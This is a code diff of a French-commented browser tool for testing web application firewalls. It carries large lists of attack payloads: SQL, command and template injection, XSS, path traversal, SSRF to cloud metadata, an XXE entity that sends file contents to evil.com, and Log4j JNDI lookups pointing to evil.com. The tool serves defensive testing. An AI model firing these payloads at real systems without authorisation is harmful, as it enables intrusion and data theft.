@@ -1,217 +1,355 @@
-// Configuration et payloads
+// Configuration et payloads basés sur waf-checker (https://github.com/SecH0us3/waf-checker)
 const PAYLOADS = {
-    'SQL Injection': [
+    'SQLi': [
+        // Basic SQL Injection
         "' OR '1'='1",
-        "1; DROP TABLE test --",
-        "admin' --",
+        "' OR '1'='1'--",
+        "' OR '1'='1'/*",
         "' OR 1=1--",
-        "' OR 'a'='a",
         "' OR 1=1#",
-        "' OR 1=1/*",
-        "' OR SLEEP(5)--",
-        "' OR 1=1 LIMIT 1;--",
-        "WAITFOR DELAY '0:0:5'",
-        ")) OR EXISTS(SELECT * FROM users WHERE username='admin')--",
-        "%2553%2527%2520OR%25201%253D1",
-        "/**/OR/**/1=1"
+        "admin'--",
+        "admin' #",
+        "1' ORDER BY 1--",
+        "1' ORDER BY 10--",
+        "1 UNION SELECT 1,2,3--",
+        "' UNION SELECT NULL,NULL,NULL--",
+        "' UNION ALL SELECT 1,2,3--",
+        // Time-based
+        "'; WAITFOR DELAY '0:0:5'--",
+        "'; SELECT SLEEP(5)--",
+        "1' AND SLEEP(5)#",
+        "1' AND BENCHMARK(5000000,SHA1('test'))--",
+        // Error-based
+        "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
+        "' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",
+        // Bypass attempts
+        "' oR '1'='1",
+        "'/**/OR/**/1=1--",
+        "' /*!50000OR*/ 1=1--",
+        "'%20OR%201=1--",
+        "' OR 'x'='x",
+        "1'||'1'='1",
+        // Advanced
+        "'; DROP TABLE users--",
+        "'; INSERT INTO users VALUES('hacker','hacked')--",
+        "1; EXEC xp_cmdshell('whoami')--"
     ],
     'XSS': [
-        "<script>alert('xss')</script>",
-        "<img src=x onerror=alert('xss')>",
-        "<iframe src=\"javascript:alert('XSS')\"></iframe>",
-        "<svg/onload=alert('xss')>",
-        "<body onload=alert('xss')>",
-        "<a href=javascript:alert('xss')>click</a>",
-        "<math href=javascript:alert(1)>",
-        "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'",
-        "<marquee onstart=alert(1)>",
-        "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\"",
-        "<input onfocus=alert(1) autofocus>"
+        // Basic XSS
+        "<script>alert('XSS')</script>",
+        "<script>alert(document.cookie)</script>",
+        "<img src=x onerror=alert('XSS')>",
+        "<img src=x onerror=alert(1)>",
+        "<svg onload=alert('XSS')>",
+        "<svg/onload=alert(1)>",
+        "<body onload=alert('XSS')>",
+        // Event handlers
+        "<div onmouseover=alert('XSS')>hover me</div>",
+        "<input onfocus=alert('XSS') autofocus>",
+        "<marquee onstart=alert('XSS')>",
+        "<video><source onerror=alert('XSS')>",
+        "<details open ontoggle=alert('XSS')>",
+        // JavaScript protocol
+        "<a href=javascript:alert('XSS')>click</a>",
+        "<iframe src=javascript:alert('XSS')>",
+        // Encoded payloads
+        "<script>alert(String.fromCharCode(88,83,83))</script>",
+        "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
+        // Bypass attempts
+        "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
+        "<SCRIPT>alert('XSS')</SCRIPT>",
+        "<<script>alert('XSS');//<</script>",
+        "<img src=\"x\" onerror=\"alert('XSS')\">",
+        "<svg><script>alert&#40;'XSS'&#41;</script>",
+        // DOM-based
+        "javascript:alert('XSS')",
+        "'-alert('XSS')-'",
+        "\";alert('XSS');//"
     ],
     'Path Traversal': [
-        "../../etc/passwd",
+        // Basic traversal
+        "../../../etc/passwd",
+        "../../../../etc/passwd",
+        "../../../../../etc/passwd",
+        "../../../../../../etc/passwd",
         "../../../../../../../etc/passwd",
-        "..\\..\\..\\..\\..\\..\\windows\\win.ini",
+        "..\\..\\..\\..\\windows\\win.ini",
+        "..\\..\\..\\..\\..\\windows\\system.ini",
+        // Encoded
         "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
-        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
+        "..%252F..%252F..%252Fetc%252Fpasswd",
+        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
+        "..%255c..%255c..%255cwindows%255cwin.ini",
+        // Null byte
+        "../../../etc/passwd%00",
+        "../../../etc/passwd%00.jpg",
+        // Filter bypass
+        "....//....//....//etc/passwd",
+        "..../..../..../etc/passwd",
+        "..;/..;/..;/etc/passwd"
     ],
     'Command Injection': [
-        "$(cat /etc/passwd)",
-        "| cat /etc/passwd",
+        // Basic injection
         "; ls -la",
-        "& whoami",
+        "| ls -la",
+        "& ls -la",
+        "&& ls -la",
+        "|| ls -la",
+        "; cat /etc/passwd",
+        "| cat /etc/passwd",
+        "; id",
         "| id",
-        "; ping -c 10 127.0.0.1",
-        "| nc -lvp 4444"
+        "; whoami",
+        "| whoami",
+        // Subshell
+        "$(cat /etc/passwd)",
+        "`cat /etc/passwd`",
+        "$(id)",
+        "`id`",
+        // Newline
+        "%0a cat /etc/passwd",
+        "%0d%0a cat /etc/passwd",
+        // Blind
+        "; sleep 5",
+        "| sleep 5",
+        "; ping -c 5 127.0.0.1",
+        // Bypass
+        ";c'a't /etc/passwd",
+        ";ca$@t /etc/passwd",
+        ";{cat,/etc/passwd}"
     ],
     'SSRF': [
+        // Localhost
         "http://127.0.0.1/",
-        "file:///etc/passwd",
-        "http://127.0.0.1/latest/meta-data/",
-        "http://localhost:80/",
-        "http://0.0.0.0:80/",
+        "http://localhost/",
+        "http://127.0.0.1:80/",
+        "http://127.0.0.1:443/",
+        "http://127.0.0.1:22/",
+        "http://127.0.0.1:3306/",
+        // IPv6
         "http://[::1]/",
-        "http://example.com@127.0.0.1/",
+        "http://[0000::1]/",
+        "http://[::ffff:127.0.0.1]/",
+        // Alternative representations
+        "http://127.1/",
+        "http://0177.0.0.1/",
+        "http://2130706433/",
+        "http://0x7f000001/",
+        "http://0/",
+        // Cloud metadata
+        "http://169.254.169.254/",
         "http://169.254.169.254/latest/meta-data/",
-        "http://[::ffff:127.0.0.1]",
-        "http://127.1",
-        "http://0177.0.0.1",
-        "http://2130706433"
+        "http://metadata.google.internal/",
+        // File protocol
+        "file:///etc/passwd",
+        "file:///c:/windows/win.ini",
+        // URL tricks
+        "http://evil.com@127.0.0.1/",
+        "http://127.0.0.1#@evil.com/",
+        "http://127.0.0.1%23@evil.com/"
     ],
-    'NoSQL Injection': [
-        "{'$gt':''}",
+    'NoSQLi': [
+        // MongoDB operators
+        "{\"$gt\":\"\"}",
         "{\"$ne\":null}",
-        "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}",
-        "{\"$where\": \"this.password == this.passwordConfirm\"}",
-        "{\"$or\": [{}, {}]}"
+        "{\"$ne\":\"\"}",
+        "{\"$regex\":\".*\"}",
+        "{\"$where\":\"1==1\"}",
+        // Authentication bypass
+        "{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}",
+        "{\"username\":{\"$gt\":\"\"},\"password\":{\"$gt\":\"\"}}",
+        "{\"username\":\"admin\",\"password\":{\"$gt\":\"\"}}",
+        // Array injection
+        "{\"$or\":[{},{}]}",
+        "{\"$or\":[{\"a\":\"a\"},{\"b\":\"b\"}]}",
+        // JavaScript injection
+        "{\"$where\":\"this.password.length > 0\"}",
+        "{\"$where\":\"sleep(5000)\"}",
+        // URL encoded
+        "username[$ne]=&password[$ne]=",
+        "username=admin&password[$gt]="
     ],
-    'Local File Inclusion': [
+    'LFI': [
+        // PHP wrappers
         "php://filter/convert.base64-encode/resource=index.php",
+        "php://filter/read=string.rot13/resource=index.php",
+        "php://input",
+        "php://data",
+        "data://text/plain,<?php phpinfo()?>",
+        "data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=",
+        // File access
         "/etc/passwd",
-        "../../../../../../../../etc/passwd",
-        "..\\..\\..\\..\\windows\\win.ini",
+        "/etc/shadow",
+        "/etc/hosts",
         "/proc/self/environ",
-        "index.php%00.jpg"
-    ],
-    'LDAP Injection': [
-        "*)(|(uid=*))",
-        "*))(objectClass=*))(|(objectClass=*)",
-        "admin)(|(password=*))"
-    ],
-    'HTTP Request Smuggling': [
-        "Transfer-Encoding: chunked 0 GARBAGE",
-        "0 GET / HTTP/1.1 Host: example.com"
-    ],
-    'Open Redirect': [
-        "//evil.com",
-        "http://evil.com",
-        "/\\evil.com",
-        "//google.com%2F%2Fevil.com",
-        "/login?Redirect=http://evil.com",
-        "/login?Redirect=../../../..//evil.com"
-    ],
-    'Sensitive Files': [
-        ".git",
-        ".git/config",
-        ".gitignore",
-        "requirements.txt",
-        "composer.json",
-        "composer.lock",
-        "package.json",
-        "package-lock.json",
-        "yarn.lock",
-        "config.php",
-        "wp-config.php",
-        ".env",
-        "docker-compose.yml",
-        "id_rsa",
-        "id_rsa.pub",
-        "web.config",
-        "appsettings.json",
-        "database.yml",
-        ".htpasswd",
-        ".htaccess",
-        "database.bak"
-    ],
-    'CRLF Injection': [
-        "%0d%0aSet-Cookie: malicious=true",
-        "Location: http://malicious.com",
-        "%0d%0aContent-Length:0",
-        "%250d%250aContent-Length:0"
-    ],
-    'UTF8/Unicode Bypass': [
-        "\\u0027 OR \\u00271\\u0027=\\u00271",
-        "%E2%80%98 OR %E2%80%981%E2%80%99=%E2%80%991",
-        "Ω OR Ω=Ω"
-    ],
-    'XXE': [
-        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
-        "<!DOCTYPE data [<!ENTITY % file SYSTEM 'file:///etc/passwd'> %file;]>",
-        "<?xml version=\"1.0\"?><foo>&xxe;</foo>",
-        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/hosts'>]><foo>&xxe;</foo>",
-        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://evil.com/evil'>]><foo>&xxe;</foo>",
-        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'file:///etc/passwd'> %xxe;]>",
-        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'http://evil.com/evil.dtd'> %xxe;]>",
-        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'php://filter/read=convert.base64-encode/resource=index.php'>]><foo>&xxe;</foo>",
-        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///c:/windows/win.ini'>]><foo>&xxe;</foo>",
-        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///dev/random'>]><foo>&xxe;</foo>"
+        "/proc/self/cmdline",
+        "/var/log/apache2/access.log",
+        "/var/log/nginx/access.log",
+        // Windows
+        "C:\\Windows\\win.ini",
+        "C:\\Windows\\System32\\drivers\\etc\\hosts",
+        // Path traversal + LFI
+        "../../../../etc/passwd",
+        "....//....//....//etc/passwd",
+        "..%00/etc/passwd"
     ],
     'SSTI': [
+        // Detection
         "{{7*7}}",
         "${7*7}",
         "<%= 7*7 %>",
-        "{{=7*7}}",
         "#{7*7}",
-        "{{7*'7'}}",
+        "*{7*7}",
+        "@(7*7)",
+        // Jinja2
         "{{config}}",
-        "{{self}}",
-        "{{[].__class__.__mro__[1].__subclasses__()}}",
-        "{{().__class__.__bases__[0].__subclasses__()}}",
+        "{{config.items()}}",
+        "{{self.__class__.__mro__}}",
+        "{{''.__class__.__mro__[1].__subclasses__()}}",
         "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
-        "<%={{7*7}}%>",
-        "${{7*7}}",
-        "{{request}}",
-        "{{url_for}}",
-        "{{cycler.__init__.__globals__.os.popen('id').read()}}"
+        // Twig
+        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
+        // Freemarker
+        "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
+        "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
+        // ERB
+        "<%= system('id') %>",
+        "<%= `id` %>",
+        // Smarty
+        "{php}echo `id`;{/php}",
+        "{system('id')}"
     ],
-    'HTTP Parameter Pollution': [
-        "param=1&param=2",
-        "user=admin&user=guest",
-        "id=1;id=2",
-        "id=1&&id=2",
-        "id=1,id=2",
-        "id=1 id=2",
-        "id=1&id=",
-        "param=&param=2",
-        "param=1&Param=2",
-        "param[0]=1&param[1]=2",
-        "param[]=1&param[]=2",
-        "param=1&%70%61%72%61%6d=2",
-        "param=1&par%61m=2",
-        "param.1=1&param.2=2",
-        "param=1|param=2",
-        "param[a]=1&param[b]=2"
+    'XXE': [
+        // Basic XXE
+        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hosts\">]><foo>&xxe;</foo>",
+        // External DTD
+        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://evil.com/evil.dtd\"> %xxe;]><foo>test</foo>",
+        // Parameter entities
+        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://evil.com/?data=%file;'>\">%eval;%exfil;]>",
+        // PHP filter
+        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\">]><foo>&xxe;</foo>",
+        // Windows
+        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><foo>&xxe;</foo>",
+        // Expect
+        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://id\">]><foo>&xxe;</foo>",
+        // SSRF via XXE
+        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><foo>&xxe;</foo>"
     ],
-    'Web Cache Poisoning': [
+    'HTTP Header Injection': [
+        // CRLF Injection
+        "%0d%0aSet-Cookie:malicious=true",
+        "%0d%0aX-Injected:header",
+        "%0aSet-Cookie:malicious=true",
+        "%0d%0aLocation:http://evil.com",
+        // Double encoding
+        "%250d%250aSet-Cookie:malicious=true",
+        // Host header
+        "evil.com",
+        "localhost",
+        "127.0.0.1",
+        // X-Forwarded headers
+        "X-Forwarded-For: 127.0.0.1",
         "X-Forwarded-Host: evil.com",
-        "X-Original-URL: /admin",
-        "Cache-Control: no-cache",
         "X-Forwarded-Proto: https",
-        "X-Host: evil.com",
-        "X-Forwarded-Scheme: javascript://",
-        "X-HTTP-Method-Override: PURGE",
-        "X-Forwarded-Server: evil.com",
-        "X-Forwarded-Port: 443",
-        "X-Original-Host: evil.com"
+        "X-Original-URL: /admin",
+        "X-Rewrite-URL: /admin"
+    ],
+    'Open Redirect': [
+        // Basic redirects
+        "//evil.com",
+        "///evil.com",
+        "////evil.com",
+        "http://evil.com",
+        "https://evil.com",
+        // URL tricks
+        "/\\evil.com",
+        "\\/evil.com",
+        "//evil.com/%2F..",
+        "//evil.com/%2f%2e%2e",
+        // Protocol tricks
+        "javascript:alert('XSS')",
+        "data:text/html,<script>alert('XSS')</script>",
+        // Encoded
+        "//evil%E3%80%82com",
+        "////evil.com",
+        "https:evil.com",
+        // URL parsing confusion
+        "http://google.com@evil.com",
+        "http://evil.com#@google.com"
+    ],
+    'Sensitive Files': [
+        // Git
+        ".git/config",
+        ".git/HEAD",
+        ".gitignore",
+        // Config files
+        ".env",
+        ".env.local",
+        ".env.production",
+        "config.php",
+        "wp-config.php",
+        "web.config",
+        "appsettings.json",
+        // Dependencies
+        "package.json",
+        "package-lock.json",
+        "composer.json",
+        "requirements.txt",
+        "Gemfile",
+        // Backup files
+        "backup.sql",
+        "database.sql",
+        "dump.sql",
+        ".bak",
+        "~",
+        // Server files
+        ".htaccess",
+        ".htpasswd",
+        "server-status",
+        "nginx.conf",
+        // SSH
+        ".ssh/id_rsa",
+        ".ssh/authorized_keys",
+        // Docker
+        "docker-compose.yml",
+        "Dockerfile"
     ],
     'IP Bypass': [
         "X-Forwarded-For: 127.0.0.1",
-        "X-Remote-IP: 127.0.0.1",
-        "X-Remote-Addr: 127.0.0.1",
+        "X-Forwarded-For: localhost",
+        "X-Forwarded-For: 10.0.0.1",
+        "X-Forwarded-For: 192.168.1.1",
         "X-Client-IP: 127.0.0.1",
         "X-Real-IP: 127.0.0.1",
-        "X-Forwarded-For: 127.0.0.1, evil.com",
-        "X-Forwarded-For: 127.0.0.1, 2130706433",
-        "X-Forwarded-For: 127.0.0.1, localhost",
-        "X-Forwarded-For: 127.0.0.1, 0.0.0.0",
-        "X-Forwarded-For: 127.0.0.1, ::1",
-        "X-Forwarded-For: 127.0.0.1, 0177.0.0.1",
-        "X-Forwarded-For: 127.0.0.1, 127.1"
+        "X-Remote-IP: 127.0.0.1",
+        "X-Remote-Addr: 127.0.0.1",
+        "X-Originating-IP: 127.0.0.1",
+        "True-Client-IP: 127.0.0.1",
+        "Cluster-Client-IP: 127.0.0.1",
+        "X-Forwarded: 127.0.0.1",
+        "Forwarded-For: 127.0.0.1",
+        "Forwarded: for=127.0.0.1"
     ],
-    'User-Agent': [
-        "User-Agent:",
-        "User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)",
-        "User-Agent: {{7*7}}",
-        "User-Agent: <?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
-        "User-Agent: <script>alert('xss')</script>",
-        "User-Agent: %0d%0aSet-Cookie: injected=true",
-        "User-Agent: ' OR '1'='1",
-        "User-Agent: *)(uid=*))(|(uid=*)",
-        "User-Agent: ${jndi:ldap://evil.com/a}",
-        "User-Agent: Fuzz Faster U Fool",
-        "User-Agent: feroxbuster/2.10.0",
-        "User-Agent: gobuster/3.1.0",
-        "User-Agent: Firefox"
+    'HTTP Parameter Pollution': [
+        "param=1&param=2",
+        "param=value1&param=value2",
+        "user=admin&user=guest",
+        "id=1&id=2&id=3",
+        "param[]=1&param[]=2",
+        "param[0]=1&param[1]=2",
+        "param=1%26param=2",
+        "action=view&action=delete"
+    ],
+    'Log4j/JNDI': [
+        "${jndi:ldap://evil.com/a}",
+        "${jndi:rmi://evil.com/a}",
+        "${jndi:dns://evil.com/a}",
+        "${${lower:j}ndi:ldap://evil.com/a}",
+        "${${upper:j}ndi:ldap://evil.com/a}",
+        "${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/a}",
+        "${jndi:ldap://127.0.0.1:1389/a}",
+        "${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//evil.com/a}"
     ]
 };
 
@@ -227,17 +365,33 @@ document.addEventListener('DOMContentLoaded', () => {
     document.getElementById('targetUrl').value = window.location.origin;
     
     // Générer les catégories
+    generateCategories();
+});
+
+function generateCategories() {
     const categoriesDiv = document.getElementById('categories');
+    categoriesDiv.innerHTML = '';
+    
     Object.keys(PAYLOADS).forEach(category => {
+        const payloadCount = PAYLOADS[category].length;
         const label = document.createElement('label');
-        label.className = 'flex items-center bg-gray-900 px-3 py-2 rounded cursor-pointer border-2 border-gray-700 hover:border-red-500 transition-all';
+        label.className = 'flex items-center gap-2 px-3 py-2 bg-dark-800 rounded-lg border border-dark-700 cursor-pointer hover:border-rose-500 transition-colors';
         label.innerHTML = `
-            <input type="checkbox" class="mr-2 category-checkbox" value="${category}" checked>
+            <input type="checkbox" class="category-checkbox accent-rose-500" value="${category}" checked>
             <span class="text-white text-sm">${category}</span>
+            <span class="text-dark-500 text-xs">(${payloadCount})</span>
         `;
         categoriesDiv.appendChild(label);
     });
-});
+}
+
+function selectAllCategories() {
+    document.querySelectorAll('.category-checkbox').forEach(cb => cb.checked = true);
+}
+
+function deselectAllCategories() {
+    document.querySelectorAll('.category-checkbox').forEach(cb => cb.checked = false);
+}
 
 // Fonctions principales
 async function runAllTests() {
@@ -248,8 +402,7 @@ async function runAllTests() {
     }
 
     // Récupérer les méthodes sélectionnées
-    const methods = Array.from(document.querySelectorAll('input[type="checkbox"][value]'))
-        .filter(cb => ['GET', 'POST', 'PUT', 'DELETE'].includes(cb.value) && cb.checked)
+    const methods = Array.from(document.querySelectorAll('.method-checkbox:checked'))
         .map(cb => cb.value);
 
     if (methods.length === 0) {
@@ -272,8 +425,8 @@ async function runAllTests() {
     shouldStop = false;
     isRunning = true;
 
-    document.getElementById('stopBtn').style.display = 'block';
-    document.getElementById('progressBar').style.display = 'block';
+    document.getElementById('stopBtn').classList.remove('hidden');
+    document.getElementById('progressBar').classList.remove('hidden');
 
     // Construire la liste des tests
     const tests = [];
@@ -302,7 +455,7 @@ async function runAllTests() {
     }
 
     isRunning = false;
-    document.getElementById('stopBtn').style.display = 'none';
+    document.getElementById('stopBtn').classList.add('hidden');
     updateStats();
 }
 
@@ -383,7 +536,7 @@ async function runSingleTest(baseUrl, { category, method, payload }) {
 function stopTests() {
     shouldStop = true;
     isRunning = false;
-    document.getElementById('stopBtn').style.display = 'none';
+    document.getElementById('stopBtn').classList.add('hidden');
 }
 
 function clearResults() {
@@ -391,7 +544,7 @@ function clearResults() {
     stats = { total: 0, '200': 0, '403': 0, '301': 0, 'err': 0 };
     updateTable();
     updateStats();
-    document.getElementById('progressBar').style.display = 'none';
+    document.getElementById('progressBar').classList.add('hidden');
 }
 
 function updateProgress(current, total) {
@@ -406,24 +559,28 @@ function updateTable() {
     if (results.length === 0) {
         tbody.innerHTML = `
             <tr>
-                <td colspan="4" class="py-8 text-center text-gray-500">
-                    Aucun résultat. Lancez les tests pour commencer.
+                <td colspan="4" class="py-12 text-center text-dark-400">
+                    <div class="w-16 h-16 rounded-2xl bg-dark-800 flex items-center justify-center mx-auto mb-4">
+                        <i class="fas fa-flask-vial text-dark-500 text-2xl"></i>
+                    </div>
+                    <p>Aucun résultat</p>
+                    <p class="text-dark-500 text-sm mt-1">Lancez les tests pour commencer</p>
                 </td>
             </tr>
         `;
         return;
     }
 
-    tbody.innerHTML = results.slice(-50).reverse().map(result => `
-        <tr class="hover:bg-gray-700 transition-all">
-            <td class="py-3 px-4 text-white">${result.category}</td>
-            <td class="py-3 px-4">
-                <span class="px-2 py-1 rounded text-xs font-semibold ${getMethodColor(result.method)}">${result.method}</span>
+    tbody.innerHTML = results.slice(-100).reverse().map(result => `
+        <tr class="hover:bg-dark-800/50 transition-colors">
+            <td class="py-3 px-6 text-white text-sm">${result.category}</td>
+            <td class="py-3 px-6">
+                <span class="px-2 py-1 rounded-lg text-xs font-mono font-medium ${getMethodColor(result.method)}">${result.method}</span>
             </td>
-            <td class="py-3 px-4">
-                <span class="status-${result.status.toLowerCase()} px-3 py-1 rounded text-white font-semibold">${result.status}</span>
+            <td class="py-3 px-6">
+                <span class="status-${result.status.toLowerCase()} px-2.5 py-1 rounded-lg font-mono text-xs font-medium">${result.status}</span>
             </td>
-            <td class="py-3 px-4 text-gray-300 font-mono text-xs break-all">${escapeHtml(result.payload)}</td>
+            <td class="py-3 px-6 text-dark-300 font-mono text-xs break-all max-w-md">${escapeHtml(result.payload)}</td>
         </tr>
     `).join('');
 }
@@ -438,12 +595,12 @@ function updateStats() {
 
 function getMethodColor(method) {
     const colors = {
-        'GET': 'bg-blue-600 text-white',
-        'POST': 'bg-green-600 text-white',
-        'PUT': 'bg-yellow-600 text-white',
-        'DELETE': 'bg-red-600 text-white'
+        'GET': 'bg-blue-500/20 text-blue-400',
+        'POST': 'bg-emerald-500/20 text-emerald-400',
+        'PUT': 'bg-amber-500/20 text-amber-400',
+        'DELETE': 'bg-rose-500/20 text-rose-400'
     };
-    return colors[method] || 'bg-gray-600 text-white';
+    return colors[method] || 'bg-dark-600 text-dark-300';
 }
 
 function escapeHtml(text) {
